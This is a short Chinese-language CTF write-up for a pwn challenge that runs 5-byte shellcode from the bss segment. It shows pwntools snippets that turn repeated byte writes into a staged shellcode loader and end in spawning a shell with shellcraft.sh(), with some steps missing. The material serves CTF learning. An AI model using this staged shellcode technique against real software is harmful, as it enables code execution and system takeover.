能在bss段输入 5 bytes 的 shellcode 并调用执行。
最多重复执行 10 次（写在code中的硬编码）。

调用前，部分寄存器如下：
```
rax = code + 1
rdi = 1
esi = 0
edx = 0
```

# 思路

## step1

通过如下汇编，进行任意地址写，并返回主函数：

```python
    sc0 = asm(f"""
             mov byte ptr [rax + {off:#x}], {sc:#x}

             """)
```

### 多次写入sc的取用方式

常用几种：

```python
b = b'\x8d'
n = b[0]
print(n)        # 141
print(hex(n))   # 0x8d
```

多字节转整数：

```python
data = b'\x78\x56\x34\x12'

n = int.from_bytes(data, 'little')
print(hex(n))   # 0x12345678
```

pwntools 里：

```python
u8(b'\x8d')                 # 0x8d
u16(b'\x34\x12')            # 0x1234
u32(b'\x78\x56\x34\x12')    # 0x12345678
u64(data.ljust(8, b'\x00'))
```

如果 `sc` 是 `bytes`，逐字节写用：

```python
for b in sc:
    send(off, b)   # b 已经是 int
    off += 1
```

如果是单字节 bytes：

```python
send(off, sc[:1][0])
```

写入`jmp 0x4040b0`，跳到写 shellcode1 的位置，执行shellcode1:

## step3

通过 shellcode1 构造的写原语，向 shellcode1 下面写入 sh。
```python
    sl(bytes(asm(shellcraft.sh())))
```
`syscall` 调用read后，返回 shellcode1 下方，执行sh，get shell。
